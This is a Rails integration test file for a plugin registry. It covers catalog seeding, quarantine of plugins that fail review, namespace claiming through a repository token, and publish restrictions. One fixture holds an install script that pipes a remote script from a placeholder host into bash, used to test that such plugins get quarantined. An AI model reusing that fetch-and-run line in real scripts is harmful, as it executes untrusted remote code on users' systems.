require "test_helper"

class SeedingAndClaimTest < ActionDispatch::IntegrationTest
  CATALOG = [
    { "publisher" => "gracehopper", "name" => "weather", "summary" => "Weather widget",
      "repository" => "https://github.com/gracehopper/weather" }
  ].freeze

  def seed!(tarball: TarballBuilder.build(manifest: TarballBuilder.manifest(id: "gracehopper.weather")))
    results = nil
    perform_enqueued_jobs do
      results = Registry::SeedCatalog.import(CATALOG, snapshotter: ->(_repo) { tarball })
    end
    results
  end

  test "seeds an unclaimed publisher whose plugin runs the pipeline and publishes" do
    results = seed!
    assert_equal "submitted", results.first[:status]

    publisher = Publisher.find_by!(name: "gracehopper")
    assert_not publisher.claimed?
    plugin = publisher.plugins.find_by!(name: "weather")
    assert plugin.versions.first.published?
    assert AuditEvent.exists?(action: "plugin.seed")
  end

  test "seeded plugins that fail review are listed but uninstallable" do
    results = seed!(tarball: TarballBuilder.build(
      manifest: TarballBuilder.manifest(id: "gracehopper.weather"),
      files: { "Widget.qml" => "import QtQuick\nItem {}\n",
               "install.sh" => "#!/bin/bash\ncurl -s https://x.example/i.sh | bash\n" }))
    assert_equal "submitted", results.first[:status]
    version = Publisher.find_by!(name: "gracehopper").plugins.first.versions.first
    assert version.quarantined?

    get plugin_path("gracehopper", "weather")
    assert_response :success
    assert_match "Under review", response.body
  end

  test "seeding is idempotent" do
    seed!
    results = seed!
    assert_equal "skipped", results.first[:status]
  end

  test "publishing to an unclaimed namespace is forbidden until claimed" do
    seed!
    publisher = Publisher.find_by!(name: "gracehopper")
    user = User.create!(email_address: "grace@example.com", name: "Grace",
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    Membership.create!(publisher:, user:, role: :owner)

    error = assert_raises(Registry::PublishVersion::PublishError) do
      Registry::PublishVersion.new(user:, publisher:, plugin_name: "weather",
        tarball_bytes: TarballBuilder.build(manifest: TarballBuilder.manifest(id: "gracehopper.weather", version: "1.1.0"))).call
    end
    assert_match(/unclaimed/, error.message)
  end

  test "repo-proof claim flow hands the namespace to the claimant" do
    seed!
    user = User.create!(email_address: "grace@example.com", name: "Grace")
    sign_in_as user

    get claim_path("gracehopper")
    assert_response :success
    publisher = Publisher.find_by!(name: "gracehopper")
    challenge = publisher.claim_challenge
    assert challenge.start_with?("omarchy-claim-")
    assert_match "raw.githubusercontent.com/gracehopper/weather", response.body

    # Wrong token in the repo -> rejected
    Rails.application.config.x.repo_proof_fetcher = ->(_url) { "not-the-token" }
    post verify_claim_path("gracehopper")
    assert_redirected_to claim_path("gracehopper")
    assert_not publisher.reload.claimed?

    # Correct token -> claimed, owner membership, challenge cleared
    Rails.application.config.x.repo_proof_fetcher = ->(_url) { "#{challenge}\n" }
    post verify_claim_path("gracehopper")
    assert_redirected_to dashboard_path
    assert publisher.reload.claimed?
    assert_nil publisher.claim_challenge
    assert user.owner_of?(publisher)
    assert AuditEvent.exists?(action: "publisher.claim_seeded", public: true)
  ensure
    Rails.application.config.x.repo_proof_fetcher = nil
  end

  test "claim page is not offered for claimed namespaces" do
    publisher = Publisher.create!(name: "taken", kind: :personal)
    user = User.create!(email_address: "x@example.com", name: "X")
    sign_in_as user
    get claim_path("taken")
    assert_redirected_to publisher_path("taken")
  end
end
